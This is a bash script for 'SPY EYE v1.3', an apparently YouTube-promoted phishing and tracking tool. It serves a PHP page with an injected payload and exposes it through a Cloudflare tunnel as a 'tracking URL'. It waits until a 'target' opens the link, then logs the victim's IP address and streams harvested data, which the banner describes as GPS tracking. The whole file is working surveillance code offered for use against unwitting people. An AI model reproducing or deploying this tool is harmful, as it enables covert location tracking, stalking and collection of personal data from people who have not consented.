#!/bin/bash
# SPY EYE v 1.3 - ENHANCED EDITION
# Powered by ATHEX
# visit https://youtube.com/inziXploit444

trap 'printf "\n";stop' 2

# Colors and Effects
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'
REVERSE='\033[7m'

# Animation functions
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

typewriter() {
    text="$1"
    delay=0.05
    for (( i=0; i<${#text}; i++ )); do
        printf "${CYAN}%s${RESET}" "${text:$i:1}"
        sleep $delay
    done
    printf "\n"
}

pulse_text() {
    text="$1"
    colors=("$RED" "$YELLOW" "$GREEN" "$CYAN" "$BLUE" "$PURPLE")
    for color in "${colors[@]}"; do
        clear
        printf "\n\n"
        printf "${color}${BOLD}%s${RESET}\n\n" "$text"
        sleep 0.3
    done
}

banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
     ███████╗██████╗ ██╗   ██╗     ███████╗ ██╗   ██╗ ███████╗
     ██╔════╝██╔══██╗╚██╗ ██╔╝     ██╔════╝ ╚██╗ ██╔╝ ██╔════╝
     ███████╗██████╔╝ ╚████╔╝      █████╗    ╚████╔╝  █████╗
     ╚════██║██╔═══╝   ╚██╔╝       ██╔══╝     ╚██╔╝   ██╔══╝
     ███████║██║        ██║        ███████╗    ██║    ███████╗
     ╚══════╝╚═╝        ╚═╝        ╚══════╝    ╚═╝    ╚══════╝
EOF
    
    echo -e "${PURPLE}"
    printf '%0.s─' $(seq 1 $(tput cols))
    echo -e "${RESET}"
    
    echo -e "${CYAN}${BLINK}>>> ${WHITE}SPY EYE ${RED}v1.3 ${CYAN}- ENHANCED EDITION ${BLINK}<<<${RESET}"
    echo -e "${YELLOW}⊱⋅ ────────────────────────────────────────── ⋅⊰${RESET}"
    echo -e "${GREEN}[✓] ${WHITE}Advanced Reconnaissance Tool"
    echo -e "${GREEN}[✓] ${WHITE}GPS Tracking & Data Collection"
    echo -e "${GREEN}[✓] ${WHITE}Stealth Mode Enabled${RESET}"
    echo -e "${YELLOW}⊱⋅ ────────────────────────────────────────── ⋅⊰${RESET}"
    echo -e "${BLUE}${BOLD}Created by: ${RED}ATHEX ${WHITE}[YT - inziXploit444]${RESET}"
    echo -e "${PURPLE}${REVERSE}  https://youtube.com/inziXploit444  ${RESET}"
    echo -e "\n"
}

dependencies() {
    echo -e "${CYAN}[~] ${WHITE}Checking system dependencies...${RESET}"
    
    deps=("php" "wget" "ssh")
    missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v $dep > /dev/null 2>&1; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -eq 0 ]; then
        echo -e "${GREEN}[✓] ${WHITE}All dependencies satisfied${RESET}\n"
        sleep 1
    else
        echo -e "${RED}[!] ${WHITE}Missing dependencies: ${missing[*]}${RESET}"
        echo -e "${YELLOW}[*] ${WHITE}Please install missing packages and try again${RESET}"
        exit 1
    fi
}

stop() {
    echo -e "\n${RED}[!] ${WHITE}Shutdown sequence initiated...${RESET}"
    
    processes=("cloudflared" "php" "ssh")
    for proc in "${processes[@]}"; do
        if pgrep -x "$proc" > /dev/null; then
            echo -e "${YELLOW}[~] ${WHITE}Terminating $proc...${RESET}"
            pkill -f "$proc" > /dev/null 2>&1
        fi
    done
    
    echo -e "${GREEN}[✓] ${WHITE}Cleanup completed${RESET}"
    echo -e "${CYAN}[*] ${WHITE}Returning to system${RESET}\n"
    exit 1
}

catch_ip() {
    echo -e "\n${GREEN}${BOLD}═══ TARGET ACQUIRED ═══${RESET}\n"
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    
    echo -e "${CYAN}┌──────────────────────────────┐${RESET}"
    echo -e "${CYAN}│ ${WHITE}📍 ${RED}TARGET IP CAPTURED ${WHITE}📍${CYAN} │${RESET}"
    echo -e "${CYAN}├──────────────────────────────┤${RESET}"
    echo -e "${CYAN}│ ${GREEN}IP: ${BLUE}$ip ${CYAN}│${RESET}"
    echo -e "${CYAN}└──────────────────────────────┘${RESET}"
    
    cat ip.txt >> saved.ip.txt
    echo -e "\n${YELLOW}[~] ${WHITE}Data logged to saved.ip.txt${RESET}"
}

checkfound() {
    echo -e "\n${PURPLE}${BOLD}═════ MONITORING MODE ═════${RESET}"
    echo -e "${CYAN}[~] ${WHITE}Listening for target activity...${RESET}"
    echo -e "${YELLOW}[*] ${WHITE}Press ${RED}Ctrl + C ${WHITE}to exit${RESET}\n"
    
    while true; do
        if [[ -e "ip.txt" ]]; then
            echo -e "${GREEN}${BLINK}⚠ ${RESET}${GREEN}${BOLD} TARGET DETECTED! ${RESET}${GREEN}${BLINK}⚠${RESET}"
            echo -e "${WHITE}Target has opened the link!${RESET}"
            catch_ip
            rm -rf ip.txt
            
            echo -e "\n${CYAN}═════ LIVE DATA STREAM ═════${RESET}"
            tail -f -n 110 data.txt &
            tail_pid=$!
            read -p "$(echo -e ${YELLOW}"Press Enter to continue monitoring..."${RESET})"
            kill $tail_pid 2>/dev/null
        fi
        
        # Animated waiting indicator
        for i in {1..3}; do
            echo -ne "${CYAN}.${RESET}"
            sleep 0.3
        done
        echo -ne "\b\b\b   \b\b\b"
        sleep 0.5
    done
}

cf_server() {
    echo -e "${BLUE}${BOLD}═════ CLOUDFLARE TUNNEL SETUP ═════${RESET}"
    
    if [[ -e cloudflared ]]; then
        echo -e "${GREEN}[✓] ${WHITE}Cloudflared already installed${RESET}"
    else
        echo -e "${YELLOW}[~] ${WHITE}Downloading Cloudflared...${RESET}"
        arch=$(uname -m)
        
        case $arch in
            *arm*|*Android*)
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
                ;;
            *aarch64*)
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
                ;;
            *x86_64*)
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
                ;;
            *)
                wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
                ;;
        esac
        
        echo -e "${GREEN}[✓] ${WHITE}Download complete${RESET}"
    fi
    
    chmod +x cloudflared
    echo -e "${GREEN}[✓] ${WHITE}Permissions set${RESET}"
    
    echo -e "\n${YELLOW}[~] ${WHITE}Starting PHP server...${RESET}"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    echo -e "${GREEN}[✓] ${WHITE}PHP server running on port 3333${RESET}"
    
    echo -e "\n${YELLOW}[~] ${WHITE}Initializing Cloudflare tunnel...${RESET}"
    rm cf.log 2>/dev/null
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    
    echo -e "${CYAN}[~] ${WHITE}Establishing secure connection"
    for i in {1..10}; do
        echo -ne "${GREEN}◉${RESET}"
        sleep 1
    done
    echo
    
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
    
    if [[ -z "$link" ]]; then
        echo -e "${RED}[✗] ${WHITE}Failed to generate tunnel link${RESET}"
        exit 1
    else
        echo -e "\n${GREEN}${BOLD}═════ TUNNEL ACTIVE ═════${RESET}"
        echo -e "${WHITE}┌─────────────────────────────────────┐"
        echo -e "${WHITE}│ ${CYAN}TRACKING URL: ${RESET}"
        echo -e "${WHITE}│ ${BLUE}$link${RESET}"
        echo -e "${WHITE}└─────────────────────────────────────┘${RESET}"
    fi
    
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    checkfound
}

local_server() {
    echo -e "${BLUE}${BOLD}═════ LOCAL HOST SETUP ═════${RESET}"
    sed 's+forwarding_link+''+g' template.php > index.php
    
    echo -e "${YELLOW}[~] ${WHITE}Starting local server...${RESET}"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    
    echo -e "${GREEN}[✓] ${WHITE}Server running at: ${CYAN}http://127.0.0.1:8080${RESET}"
    echo -e "${YELLOW}[!] ${WHITE}Make sure target can access this address${RESET}"
    
    checkfound
}

SPYEYE() {
    echo -e "${PURPLE}${BOLD}═════ INITIALIZING SPY EYE ═════${RESET}"
    
    # Initialize files
    if [[ -e data.txt ]]; then
        cat data.txt >> targetreport.txt
        rm -rf data.txt
        touch data.txt
    fi
    
    if [[ -e ip.txt ]]; then
        rm -rf ip.txt
    fi
    
    sed -e '/tc_payload/r payload' index_chat.html > index.html
    
    echo -e "\n${CYAN}${BOLD}⚡ SELECT TUNNELING METHOD ⚡${RESET}"
    echo -e "${WHITE}1. ${GREEN}Cloudflare Tunnel ${YELLOW}(Recommended)${RESET}"
    echo -e "${WHITE}2. ${BLUE}Local Host ${YELLOW}(Port 8080)${RESET}"
    echo -e "${WHITE}3. ${RED}Exit${RESET}"
    
    echo -e "\n${CYAN}[?] ${WHITE}Select option [1-3]: ${RESET}"
    read -n 1 option
    
    case $option in
        1)
            echo -e "\n${GREEN}[→] ${WHITE}Selected: Cloudflare Tunnel${RESET}"
            cf_server
            ;;
        2)
            echo -e "\n${GREEN}[→] ${WHITE}Selected: Local Host${RESET}"
            local_server
            ;;
        3)
            echo -e "\n${RED}[!] ${WHITE}Exiting...${RESET}"
            exit 0
            ;;
        *)
            echo -e "\n${RED}[!] ${WHITE}Invalid option, using Cloudflare${RESET}"
            cf_server
            ;;
    esac
}

# Main execution
clear
pulse_text "SPY EYE v1.3 - INITIALIZING"
banner
dependencies
SPYEYE